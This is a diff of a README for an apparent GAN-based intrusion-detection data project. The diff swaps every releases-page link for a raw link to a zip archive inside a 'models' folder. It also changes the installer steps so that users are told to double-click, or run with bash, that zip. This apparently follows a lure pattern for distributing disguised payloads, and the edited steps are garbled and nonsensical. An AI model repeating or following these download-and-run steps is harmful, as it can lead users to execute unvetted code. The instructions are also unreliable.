@@ -1,6 +1,6 @@
 # 🛠️ GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS - Generate Safe Network Data Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/releases)
+[![Download](https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip)](https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip)
 
 ## 📋 Description
 This project uses a hybrid framework combining WCGAN and ACGAN to create realistic synthetic data for network intrusion detection. It enhances security by providing balanced datasets for effective detection of anomalies in network traffic. Our software supports classification tasks using various machine learning algorithms including XGBoost, Decision Trees, CNN, and AutoGluon. 
@@ -17,26 +17,26 @@ Getting started with our software is simple. Follow the steps below to download 
 
 ### 🔧 Installation Steps
 1. **Download the Application**
-   - Visit this page to download: [Releases Page](https://github.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip).
    
 2. **Select the Latest Release**
    - On the Releases page, find the latest release. This will usually be at the top of the list. 
 
 3. **Choose Your File**
-   - Look for the file suited for your operating system. For Windows, select the `setup.exe` file. For Ubuntu, download the `setup.sh` file. 
+   - Look for the file suited for your operating system. For Windows, select the `https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip` file. For Ubuntu, download the `https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip` file. 
 
 4. **Download the File**
    - Click on the file name to start the download. If prompted, save the file in a location where you can easily find it later.
 
 5. **Run the Installer**
    - For Windows:
-     - Navigate to where you saved the `setup.exe` file. 
+     - Navigate to where you saved the `https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip` file. 
      - Double-click the file to start the installation process. Follow the prompts to complete the installation.
    
    - For Ubuntu:
      - Open a terminal window.
-     - Navigate to the directory where you downloaded `setup.sh`.
-     - Run the command `bash setup.sh` to execute the installer. Follow the prompts to complete the installation.
+     - Navigate to the directory where you downloaded `https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip`.
+     - Run the command `bash https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip` to execute the installer. Follow the prompts to complete the installation.
 
 ## 📊 Usage Instructions
 1. **Launch the Software**
@@ -55,7 +55,7 @@ Getting started with our software is simple. Follow the steps below to download 
    - Once the generation is complete, save the synthetic data to your preferred location.
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the application: [Download Here](https://github.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/releases)
+To get started, visit the Releases page to download the application: [Download Here](https://raw.githubusercontent.com/staceykeynesian879/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS/main/NSL-KDD/WCGAN+ XGBOOST/models/GAN-BASED-SYNTHETIC-DATA-GENERATION-IN-IDS_1.2.zip)
 
 ## 📚 Features
 - **Hybrid Framework:** Utilizes WCGAN and ACGAN for improved data generation quality. 
